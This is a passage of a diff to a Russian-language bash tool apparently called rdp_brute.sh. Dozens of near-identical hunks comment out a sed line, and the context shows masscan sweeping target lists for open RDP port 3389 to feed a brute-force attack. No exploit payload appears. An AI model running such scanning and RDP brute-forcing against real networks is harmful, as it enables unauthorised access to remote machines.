 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6237,7 +6241,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6285,7 +6289,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6334,7 +6338,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6383,7 +6387,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6432,7 +6436,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6481,7 +6485,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6530,7 +6534,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6579,7 +6583,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6628,7 +6632,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6676,7 +6680,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6725,7 +6729,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6774,7 +6778,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6823,7 +6827,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6872,7 +6876,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6921,7 +6925,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -6970,7 +6974,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7019,7 +7023,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7068,7 +7072,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7117,7 +7121,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7166,7 +7170,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7215,7 +7219,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7264,7 +7268,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7313,7 +7317,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7362,7 +7366,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7411,7 +7415,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7458,7 +7462,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7507,7 +7511,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7555,7 +7559,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7604,7 +7608,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7653,7 +7657,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7702,7 +7706,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7751,7 +7755,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7800,7 +7804,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7849,7 +7853,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7898,7 +7902,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7947,7 +7951,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -7996,7 +8000,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8045,7 +8049,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8094,7 +8098,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8143,7 +8147,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8192,7 +8196,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8241,7 +8245,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8290,7 +8294,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8339,7 +8343,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8388,7 +8392,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8437,7 +8441,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8486,7 +8490,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8535,7 +8539,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8584,7 +8588,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8633,7 +8637,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8682,7 +8686,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8729,7 +8733,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8777,7 +8781,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8825,7 +8829,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8873,7 +8877,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8921,7 +8925,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -8969,7 +8973,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9017,7 +9021,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9065,7 +9069,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9114,7 +9118,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9163,7 +9167,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9211,7 +9215,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9259,7 +9263,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9307,7 +9311,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9356,7 +9360,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9404,7 +9408,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"
@@ -9453,7 +9457,7 @@ trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_
 echo ""
